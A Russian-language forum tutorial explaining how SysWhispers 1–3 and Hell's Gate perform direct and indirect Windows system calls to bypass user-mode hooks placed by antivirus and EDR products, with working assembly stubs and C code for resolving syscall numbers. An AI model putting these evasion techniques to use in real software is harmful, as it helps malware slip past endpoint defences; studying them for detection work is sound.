SysWhispers использует скрипт на Python для генерации двух файлов (пример). SSN берутся из <a href="https://j00ru.vexillium.org/syscalls/nt/64/" target="_blank" class="link link--external" rel="noopener">Таблицы системных ыызовов Windows X86-64</a> и жестко кодируются в созданный файл сборки. Затем функции сборки определяют, какой SSN использовать.<br />
<br />
<b>Выходной пример SysWhispers: </b><br />
<br />
Ниже приведены функции сборки, полученные при использовании SysWhispers для генерации прямых системных вызовов для NtMapViewOfSection.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>// ...

NtMapViewOfSection PROC
    mov rax, gs:[60h]                             ; Load PEB into RAX.
NtMapViewOfSection_Check_X_X_XXXX:                ; Check major version.
    cmp dword ptr [rax+118h], 5
    je  NtMapViewOfSection_SystemCall_5_X_XXXX
    cmp dword ptr [rax+118h], 6
    je  NtMapViewOfSection_Check_6_X_XXXX
    cmp dword ptr [rax+118h], 10
    je  NtMapViewOfSection_Check_10_0_XXXX
    jmp NtMapViewOfSection_SystemCall_Unknown
NtMapViewOfSection_Check_6_X_XXXX:               ; Check minor version for Windows Vista/7/8.
    cmp dword ptr [rax+11ch], 0
    je  NtMapViewOfSection_Check_6_0_XXXX
    cmp dword ptr [rax+11ch], 1
    je  NtMapViewOfSection_Check_6_1_XXXX
    cmp dword ptr [rax+11ch], 2
    je  NtMapViewOfSection_SystemCall_6_2_XXXX
    cmp dword ptr [rax+11ch], 2
    je  NtMapViewOfSection_SystemCall_6_3_XXXX
    jmp NtMapViewOfSection_SystemCall_Unknown
NtMapViewOfSection_Check_6_0_XXXX:               ; Check build number for Windows Vista.
    cmp dword ptr [rax+120h], 6000
    je  NtMapViewOfSection_SystemCall_6_0_6000
    cmp dword ptr [rax+120h], 6001
    je  NtMapViewOfSection_SystemCall_6_0_6001
    cmp dword ptr [rax+120h], 6002
    je  NtMapViewOfSection_SystemCall_6_0_6002
    jmp NtMapViewOfSection_SystemCall_Unknown
NtMapViewOfSection_Check_6_1_XXXX:               ; Check build number for Windows 7.
    cmp dword ptr [rax+120h], 7600
    je  NtMapViewOfSection_SystemCall_6_1_7600
    cmp dword ptr [rax+120h], 7601
    je  NtMapViewOfSection_SystemCall_6_1_7601
    jmp NtMapViewOfSection_SystemCall_Unknown
NtMapViewOfSection_Check_10_0_XXXX:              ; Check build number for Windows 10.
    cmp dword ptr [rax+120h], 10240
    je  NtMapViewOfSection_SystemCall_10_0_10240
    cmp dword ptr [rax+120h], 10586
    je  NtMapViewOfSection_SystemCall_10_0_10586
    cmp dword ptr [rax+120h], 14393
    je  NtMapViewOfSection_SystemCall_10_0_14393
    cmp dword ptr [rax+120h], 15063
    je  NtMapViewOfSection_SystemCall_10_0_15063
    cmp dword ptr [rax+120h], 16299
    je  NtMapViewOfSection_SystemCall_10_0_16299
    cmp dword ptr [rax+120h], 17134
    je  NtMapViewOfSection_SystemCall_10_0_17134
    cmp dword ptr [rax+120h], 17763
    je  NtMapViewOfSection_SystemCall_10_0_17763
    cmp dword ptr [rax+120h], 18362
    je  NtMapViewOfSection_SystemCall_10_0_18362
    cmp dword ptr [rax+120h], 18363
    je  NtMapViewOfSection_SystemCall_10_0_18363
    jmp NtMapViewOfSection_SystemCall_Unknown
NtMapViewOfSection_SystemCall_5_X_XXXX:          ; Windows XP and Server 2003
    mov eax, 0025h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_6_0_6000:          ; Windows Vista SP0
    mov eax, 0025h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_6_0_6001:          ; Windows Vista SP1 and Server 2008 SP0
    mov eax, 0025h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_6_0_6002:          ; Windows Vista SP2 and Server 2008 SP2
    mov eax, 0025h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_6_1_7600:          ; Windows 7 SP0
    mov eax, 0025h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_6_1_7601:          ; Windows 7 SP1 and Server 2008 R2 SP0
    mov eax, 0025h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_6_2_XXXX:          ; Windows 8 and Server 2012
    mov eax, 0026h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_6_3_XXXX:          ; Windows 8.1 and Server 2012 R2
    mov eax, 0027h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_10_0_10240:        ; Windows 10.0.10240 (1507)
    mov eax, 0028h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_10_0_10586:        ; Windows 10.0.10586 (1511)
    mov eax, 0028h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_10_0_14393:        ; Windows 10.0.14393 (1607)
    mov eax, 0028h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_10_0_15063:        ; Windows 10.0.15063 (1703)
    mov eax, 0028h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_10_0_16299:        ; Windows 10.0.16299 (1709)
    mov eax, 0028h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_10_0_17134:        ; Windows 10.0.17134 (1803)
    mov eax, 0028h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_10_0_17763:        ; Windows 10.0.17763 (1809)
    mov eax, 0028h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_10_0_18362:        ; Windows 10.0.18362 (1903)
    mov eax, 0028h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_10_0_18363:        ; Windows 10.0.18363 (1909)
    mov eax, 0028h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_Unknown:           ; Unknown/unsupported version.
    ret
NtMapViewOfSection_Epilogue:
    mov r10, rcx
    syscall
    ret
NtMapViewOfSection ENDP

// ...</code></pre>
	</div>
</div><br />
<b>Объяснение:</b><br />
<br />
Структура PEB содержит три элемента, которые можно использовать для определения версии Windows OS:<br />
<ul>
<li data-xf-list-type="ul">OSBuildNumber</li>
<li data-xf-list-type="ul">OSMajorVersion</li>
<li data-xf-list-type="ul">OSMinorVersion</li>
</ul>64-битные функции сборки, созданные SysWhispers, используют эти элементы для перехода на место, где находится правильный SSN в виде жестко закодированного значения. Используемая логика по сути представляет собой несколько if и else if утверждений. Например, если целевая машина - Windows 10 1809, то происходит следующая логика:<br />
<ul>
<li data-xf-list-type="ul">Поскольку основной элемент версии PEB равен 10, выполняется метка NtMapViewOfSection_Check_10_0_XXXX.</li>
<li data-xf-list-type="ul">Эта метка затем проверяет номер сборки системы. В этом примере этот номер равен 1809, что заставляет его перейти на метку NtMapViewOfSection_SystemCall_10_0_17763.</li>
<li data-xf-list-type="ul">Затем SSN устанавливается в 0028h.</li>
<li data-xf-list-type="ul">Затем происходит финальный переход на метку NtMapViewOfSection_Epilogue, где выполняются оставшиеся инструкции системного вызова. Напомним, что функция системного вызова имеет следующий формат:</li>
</ul>
	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>mov r10, rcx
mov eax, SSN
syscall
ret</code></pre>
	</div>
</div><br />
<b>SysWhispers2: </b><br />
<br />
<a href="https://github.com/jthuraisamy/SysWhispers2" target="_blank" class="link link--external" rel="noopener">SysWhispers2</a> использует ту-же концепцию, что и его предыдущая версия, главное отличие заключается в том, что SysWhispers2 не требует от пользователя указания, какие версии Windows поддерживать в генераторе Python.<br />
<br />
Это потому, что SysWhispers2 больше не полагается на Таблицу системных Вызовов Windows X86-64 для SSN, а вместо этого использует метод,<b> называемый сортировка по адресу системного вызова.</b> Этот метод исключает необходимость в ручном выборе SSN на этапе выполнения, что приводит к меньшему размеру оболочек системных вызовов.<br />
<br />
<b>Сортировка по адресу системного вызова:</b><br />
<br />
Сортировка по адресу системного вызова - это метод для получения SSN системного вызова во время выполнения. Это делается путем поиска всех системных вызовов, начинающихся с Zw, затем сохранения их адреса в массиве и сортировки их в возрастающем порядке (от меньшего к большему адресу). SSN станет индексом системного вызова, сохраненного в массиве.<br />
<br />
<b>Реализация SysWhispers2</b>:<br />
<br />
Сортировка по адресу системного вызова осуществляется через функцию SW2_PopulateSyscallList Syswhispers2, которая извлекает базовый адрес NTDLL и его экспортный каталог. Используя эту информацию, она рассчитывает RVA экспортируемых функций (адреса, имена, порядок).<br />
<br />
Далее SysWhispers2 проверяет имена экспортируемых функций на предмет префиксов с Zw. Эти имена функций хешируются и сохраняются в массиве вместе с их адресами. После этого SW2_PopulateSyscallList сортирует собранные адреса в возрастающем порядке.<br />
<br />
Чтобы найти SSN системного вызова, функция SW2_GetSyscallNumber принимает хеш имени целевого системного вызова и возвращает индекс, где этот хеш системного вызова найден в массиве.<br />
<b>Значение индекса - это SSN системного вызова.</b><br />
<br />
Визуальный пример реализации показан ниже.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785573407.png"
		data-src="https://osint42.org/attachments/1746785573407-png.209/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785573407-png.209/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785573407.png"
			title="1746785573407.png"
			width="311" height="681" loading="lazy" />
	</div><br />
<br />
<b>SysWhispers3:</b><br />
<br />
Помните, что системный вызов отвечает за изменение потока выполнения из режима пользователя в режим ядра. Легитимные инструкции системного вызова всегда должны выполняться из адресного пространства ntdll.dll. Поэтому, когда инструкция системного вызова включена в двоичный файл, как это было с SysWhispers и SysWhispers2, инструкция системного вызова происходит извне этого адресного пространства. Таким образом, <b>двоичный файл, выполняющий инструкцию системного вызова, может быть индикатором злонамеренных намерений.</b><br />
<br />
Обновления в Syswhispers3 можно найти в блоге <a href="https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/" target="_blank" class="link link--external" rel="noopener">&quot;SysWhispers умер, да здравствует SysWhispers!&quot;</a>. Ниже показана сводка изменений.<br />
<br />
Сам исходник есть на гитхабе:<a href="https://github.com/klezVirus/SysWhispers3" target="_blank" class="link link--external" rel="noopener">GitHub - klezVirus/SysWhispers3: SysWhispers on Steroids - AV/EDR evasion via direct system calls.</a><br />
<br />
<b>Изменения в SysWhispers3:</b><br />
<br />
Вместо того чтобы напрямую вызывать инструкцию системного вызова из функций сборки, SysWhispers3 будет искать инструкцию системного вызова в адресном пространстве ntdll.dll, выполнять инструкцию прыжка туда и выполнять инструкцию системного вызова. <b>Этот метод использует технику косвенного системного вызова.</b><br />
<br />
Кроме того, Syswhispers3 поставляется с опцией jumper_randomized, которая будет выполнять прыжок к инструкции системного вызова, которая принадлежит случайной функции. Например, при вызове NtAllocateVirtualMemory с этой опцией инструкция системного вызова, к которой будет произведен прыжок, не принадлежит NtAllocateVirtualMemory в ntdll.dll. Вместо этого инструкция принадлежит другому системному вызову, такому как функция NtTestAlert.<br />
<br />
<b>Как и в предыдущей версии, Syswhispers3 использует метод сортировки по адресу системного вызова, чтобы найти системный вызов.<br />
<br />
Выходной пример SysWhispers3: </b><br />
<br />
SysWhispers3 используется для генерации заглушки вызова системного вызова для функции NtMapViewOfSection. Выход Syswhispers3 выглядит аналогично Syswhispers2 с основным отличием в дополнительных вызовах функций SW3_GetRandomSyscallAddress и SW3_GetSyscallNumber, которые показаны и объяснены ниже.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785588464.png"
		data-src="https://osint42.org/attachments/1746785588464-png.210/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785588464-png.210/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785588464.png"
			title="1746785588464.png"
			width="1721" height="1036" loading="lazy" />
	</div><br />
<br />
<b>Модуль Syscalls-asm.x64.asm</b><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>Syscalls-asm.x64.asm

.code

EXTERN SW3_GetSyscallNumber: PROC

EXTERN SW3_GetRandomSyscallAddress: PROC

NtMapViewOfSection PROC
    mov [rsp +8], rcx                      ; Сохранить регистры.
    mov [rsp+16], rdx
    mov [rsp+24], r8
    mov [rsp+32], r9
    sub rsp, 28h
    mov ecx, 01A80161Bh                     ; Загрузить хеш функции в ECX.
    call SW3_GetRandomSyscallAddress        ; Получить смещение системного вызова из другого API.
    mov r15, rax                            ; Сохранить адрес системного вызова {поскольку SW3_GetRandomSyscallAddress вернет адрес инструкции &#039;syscall&#039; в регистре rax}
    mov ecx, 01A80161Bh                     ; Загрузить хеш функции снова в ECX (необязательно).
    call SW3_GetSyscallNumber               ; Преобразовать хеш функции в номер системного вызова. {Теперь, eax содержит SSN}
    add rsp, 28h
    mov rcx, [rsp+8]                        ; Восстановить регистры.
    mov rdx, [rsp+16]
    mov r8, [rsp+24]
    mov r9, [rsp+32]
    mov r10, rcx
    jmp r15                                 ; Перейти к -&gt; Вызов системного вызова. {r15 - это адрес случайной инструкции &#039;syscall&#039; в ntdll.dll}
NtMapViewOfSection ENDP

end</code></pre>
	</div>
</div><br />
<b>Модуль Syscalls.c<br />
<br />
SW3_GetSyscallNumber и SW3_GetRandomSyscallAddress:</b><br />
<br />
Функция SW3_GetSyscallNumber находит системный вызов, а SW3_GetRandomSyscallAddress извлекает адрес инструкции системного вызова случайного системного вызова внутри ntdll.dll, потому что была использована, опция jumper_randomized.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>EXTERN_C DWORD SW3_GetSyscallNumber(DWORD FunctionHash)
{
    // Ensure SW3_SyscallList is populated.
    if (!SW3_PopulateSyscallList()) return -1;

    for (DWORD i = 0; i &lt; SW3_SyscallList.Count; i++)
    {
        if (FunctionHash == SW3_SyscallList.Entries[i].Hash)
        {
            return i;
        }
    }

    return -1;
}


EXTERN_C PVOID SW3_GetRandomSyscallAddress(DWORD FunctionHash)
{
    // Ensure SW3_SyscallList is populated.
    if (!SW3_PopulateSyscallList()) return NULL;

    DWORD index = ((DWORD) rand()) % SW3_SyscallList.Count;

    while (FunctionHash == SW3_SyscallList.Entries[index].Hash){
        // Spoofing the syscall return address
        index = ((DWORD) rand()) % SW3_SyscallList.Count;
    }
    return SW3_SyscallList.Entries[index].SyscallAddress;
}</code></pre>
	</div>
</div><br />
<b>Вызов системных вызовов при помощи Hell&#039;s Gate<br />
Введение</b><br />
<br />
Помните, что использование прямых системных вызовов (syscalls) — это способ обойти хуки в пользовательском режиме, выполняя сборку инструкций системного вызова вручную.<br />
<br />
&quot;Врата Ада&quot; (Hell&#039;s Gate) - это другая техника, используемая для выполнения прямых системных вызовов. Читая ntdll.dll, &quot;Врата Ада&quot; могут динамически находить системные вызовы и затем выполнять их из двоичного кода.<br />
<br />
Статья о &quot;Вратах Ада&quot; доступна <a href="https://vxug.fakedoma.in/papers/VXUG/Exclusive/HellsGate.pdf" target="_blank" class="link link--external" rel="noopener">здесь.</a><br />
<br />
<b>Как работают &quot;Врата Ада&quot;</b><br />
<br />
В статье выше мы демонстрировали прямые системные вызовы с помощью SysWhispers. SSN был либо жёстко закодирован, либо найден с использованием метода сортировки по адресу системного вызова, чтобы определить SSN во время выполнения. &quot;Врата Ада&quot;, с другой стороны, используют другой подход к поиску SSN.<br />
<br />
Подход &quot;Врат Ада&quot; заключается в поиске SSN внутри опкодов перехваченного системного вызова, которые затем вызываются в его функциях сборки.<br />
<br />
<b>Разбор &quot;Врат Ада&quot; </b><br />
<br />
Сложность кода требует разбиения объяснения на более мелкие подразделы для более лёгкого понимания.<br />
<br />
<b>Структура системного вызова</b><br />
<br />
Код &quot;Врат Ада&quot; начинается с определения структуры VX_TABLE_ENTRY. Эта структура представляет собой системный вызов и содержит адрес, хеш-значение имени системного вызова и SSN. Структура показана ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _VX_TABLE_ENTRY {
    PVOID   pAddress;             // Адрес функции системного вызова
    DWORD64 dwHash;               // Хеш-значение имени системного вызова
    WORD    wSystemCall;          // SSN системного вызова
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;</code></pre>
	</div>
</div><br />
Например, NtAllocateVirtualMemory будет представлен как VX_TABLE_ENTRY NtAllocateVirtualMemory.<br />
<br />
<b>Таблица системных вызовов</b><br />
<br />
Используемые системные вызовы хранятся внутри другой структуры, VX_TABLE. Поскольку каждый элемент в VX_TABLE является системным вызовом, каждый элемент будет типа VX_TABLE_ENTRY.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _VX_TABLE {
    VX_TABLE_ENTRY NtAllocateVirtualMemory;
    VX_TABLE_ENTRY NtProtectVirtualMemory;
    VX_TABLE_ENTRY NtCreateThreadEx;
    VX_TABLE_ENTRY NtWaitForSingleObject;
} VX_TABLE, * PVX_TABLE;</code></pre>
	</div>
</div><br />
<b>Главная функция </b><br />
<br />
Главная функция начинается с вызова функции RtlGetThreadEnvironmentBlock, которая используется для получения TEB. Это требуется для получения базового адреса ntdll.dll через PEB (помните, что PEB находится в TEB). Затем экспортный каталог ntdll.dll извлекается с использованием GetImageExportDirectory. Экспортный каталог находится путем анализа заголовков DOS и Nt, как было показано в предыдущих модулях.<br />
<br />
Затем для каждого системного вызова элемент dwHash инициализируется (например, NtAllocateVirtualMemory.dwHash) его соответствующим хеш-значением. При каждой инициализации вызывается функция GetVxTableEntry, которая показана ниже. Функция разделена на несколько частей для упрощения процесса объяснения.<br />
<br />
<b>GetVxTableEntry - Часть 1</b><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
    PDWORD pdwAddressOfFunctions    = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfFunctions);
    PDWORD pdwAddressOfNames        = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfNames);
    PWORD pwAddressOfNameOrdinales  = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfNameOrdinals);

    for (WORD cx = 0; cx &lt; pImageExportDirectory-&gt;NumberOfNames; cx++) {
        PCHAR pczFunctionName  = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (djb2(pczFunctionName) == pVxTableEntry-&gt;dwHash) {
            pVxTableEntry-&gt;pAddress = pFunctionAddress;

            // ...
        }
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
Первая часть функции ищет значение хеша Djb2, равное хешу системного вызова, pVxTableEntry-&gt;dwHash. Как только найдено совпадение, адрес системного вызова будет сохранен в pVxTableEntry-&gt;pAddress. Вторая часть функции — это место, где находится трюк &quot;Врат Ада&quot;.<br />
<br />
<b>GetVxTableEntry - Часть 2</b><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>            // Быстрый и грязный исправление в случае, если функция была перехвачена
            WORD cw = 0;
            while (TRUE) {
                // проверить, является ли это системным вызовом, в этом случае мы слишком далеко
                if (*((PBYTE)pFunctionAddress + cw) == 0x0f &amp;&amp; *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
                    return FALSE;

                // проверить, является ли это инструкцией возврата, в этом случае мы, вероятно, тоже слишком далеко
                if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
                    return FALSE;

                // Первые опкоды должны быть:
                //    MOV R10, RCX
                //    MOV RCX, &lt;системный вызов&gt;
                if (*((PBYTE)pFunctionAddress + cw) == 0x4c
                    &amp;&amp; *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
                    &amp;&amp; *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
                    &amp;&amp; *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
                    &amp;&amp; *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
                    &amp;&amp; *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
                    BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
                    BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
                    pVxTableEntry-&gt;wSystemCall = (high &lt;&lt; 8) | low;
                    break;
                }

                cw++;
            };</code></pre>
	</div>
</div><br />
Вторая часть начинается с цикла while после поиска адреса системного вызова, pFunctionAddress. Цикл while ищет байты 0x4c, 0x8b, 0xd1, 0xb8, которые являются опкодами для команд mov r10, rcx и mov rcx, ssn, являясь началом неизмененного системного вызова.<br />
<br />
В случае, если системный вызов перехвачен, опкоды могут не совпадать из-за добавления хука безопасностными решениями до инструкции системного вызова. Чтобы устранить это, &quot;Врата Ада&quot; пытаются сопоставить опкоды, и если совпадение не найдено, переменная cw инкрементируется, что добавляет к адресу системного вызова на последующей итерации цикла. Этот процесс продолжается, перемещаясь на один байт за раз, пока не достигнуты инструкции mov r10, rcx и mov rcx, ssn. Ниже показано, как &quot;Врата Ада&quot; находят опкоды, переходя через хук.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785613385.png"
		data-src="https://osint42.org/attachments/1746785613385-png.211/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785613385-png.211/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785613385.png"
			title="1746785613385.png"
			width="794" height="353" loading="lazy" />
	</div><br />
<br />
<b>Проверка границы</b><br />
<br />
Чтобы предотвратить дальний поиск и получение различного SSN для другого системного вызова, в начале цикла while сделаны два условия для проверки инструкций системного вызова и возврата, расположенных в конце системного вызова. Если поиск достигает одной из этих инструкций и опкоды 0x4c, 0x8b, 0xd1, 0xb8 не были определены, поиск SSN не удастся.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// проверить, является ли это системным вызовом, в этом случае мы слишком далеко
if (*((PBYTE)pFunctionAddress + cw) == 0x0f &amp;&amp; *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
    return FALSE;

// проверить, является ли это инструкцией возврата, в этом случае мы, вероятно, тоже слишком далеко
if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
    return FALSE;</code></pre>
	</div>
</div><br />
<b>Вычисление и сохранение SSN </b><br />
<br />
С другой стороны, если найдено успешное совпадение для опкодов, &quot;Врата Ада&quot; будут вычислять номер системного вызова и сохранять его в pVxTableEntry-&gt;wSystemCall. Не обязательно понимать вычисление, которое требует знания побитовых операторов, однако те, кто знаком с этим понятием, могут продолжить чтение этого раздела.<br />
<br />
Функция сначала использует оператор сдвига влево (&lt;&lt;) для сдвига битов переменной high влево на 8 раз. Затем она использует побитовый оператор OR (|) для сравнения каждого бита первого операнда (являющегося high &lt;&lt; 8) с соответствующим битом второго операнда (являющегося low).<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>pVxTableEntry-&gt;wSystemCall = (high &lt;&lt; 8) | low;</code></pre>
	</div>
</div><br />
Для лучшего понимания приведен пример использования системного вызова NtProtectVirtualMemory для демонстрации подхода &quot;Врат Ада&quot; к вычислению SSN.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785627277.png"
		data-src="https://osint42.org/attachments/1746785627277-png.212/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785627277-png.212/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785627277.png"
			title="1746785627277.png"
			width="977" height="97" loading="lazy" />
	</div><br />
<br />
На изображении выше показано, как &quot;Врата Ада&quot; находят опкоды, переходя через хук. Это изображение упрощено до следующего фрагмента:<br />
<br />
00007FFCC42C4570 | 4C:8BD1                          | mov r10,rcx                                     |<br />
00007FFCC42C4573 | B8 50000000                   | mov eax,50                                     | 50:&#039;P&#039;<br />
00007FFCC42C4582 | 0F05                                | syscall                                             |<br />
00007FFCC42C4584 | C3                                   | ret                                                   |<br />
<br />
Байты C4C:8BD1 B8 50000000 соответствуют следующим смещениям:<br />
<br />
4C имеет смещение 0, 8B имеет смещение 1 и D1 имеет смещение 2, B8 имеет смещение 3, 50 имеет смещение 4, 00 имеет смещение 5 и так далее.<br />
Функция GetVxTableEntry указывает, что переменные high и low имеют смещение 5 и 4 соответственно.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BYTE high = *((PBYTE)pFunctionAddress + 5 + cw); // Смещение 5
BYTE low = *((PBYTE)pFunctionAddress + 4 + cw); // Смещение 4</code></pre>
	</div>
</div><br />
Проверка значения смещения 5 показывает, что это 0x00, в то время как смещение 4 равно 0x50. Это означает, что значение high равно 0x00, а значение low равно 0x50. Таким образом, SSN равно (0x00 &lt;&lt; 8) | 0x50.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785650036.png"
		data-src="https://osint42.org/attachments/1746785650036-png.214/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785650036-png.214/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785650036.png"
			title="1746785650036.png"
			width="618" height="78" loading="lazy" />
	</div><br />
<br />
Результат побитовой операции совпадает с номером SSN системного вызова NtProtectVirtualMemory, который равен 50 в шестнадцатеричной системе.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785642122.png"
		data-src="https://osint42.org/attachments/1746785642122-png.213/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785642122-png.213/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785642122.png"
			title="1746785642122.png"
			width="977" height="97" loading="lazy" />
	</div><br />
<br />
<b>Вызов системного вызова</b><br />
<br />
Теперь, когда &quot;Врата Ада&quot; полностью инициализировали структуру VX_TABLE_ENTRY целевого системного вызова, они могут вызвать его. Для этого &quot;Врата Ада&quot; используют две функции сборки 64-бит: HellsGate и HellDescent, показанные в файле hellsgate.asm.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>data
    wSystemCall DWORD 000h              ; это глобальная переменная, используемая для сохранения SSN системного вызова

.code
    HellsGate PROC
        mov wSystemCall, 000h
        mov wSystemCall, ecx            ; обновление переменной &#039;wSystemCall&#039; входным аргументом (значением регистра ecx)
        ret
    HellsGate ENDP

    HellDescent PROC
        mov r10, rcx
        mov eax, wSystemCall            ; `wSystemCall` - это SSN вызываемого системного вызова
        syscall
        ret
    HellDescent ENDP
end</code></pre>
	</div>
</div><br />
